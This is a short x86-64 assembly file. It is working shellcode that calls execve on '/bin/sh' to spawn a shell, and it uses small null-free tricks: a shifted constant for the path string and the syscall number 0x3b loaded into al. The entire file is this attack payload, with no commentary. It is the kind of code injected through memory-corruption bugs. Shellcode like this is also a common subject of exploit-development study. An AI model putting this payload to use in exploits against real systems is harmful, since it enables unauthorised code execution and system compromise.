global _start

_start:
    xor rax, rax
    push rax
    push rax
    pop rsi
    pop rdx
    mov rdi, 0x68732f6e69622fff
    shr rdi, 0x8
    push rdi
    push rsp
    pop rdi
    add al, 0x3b
    syscall
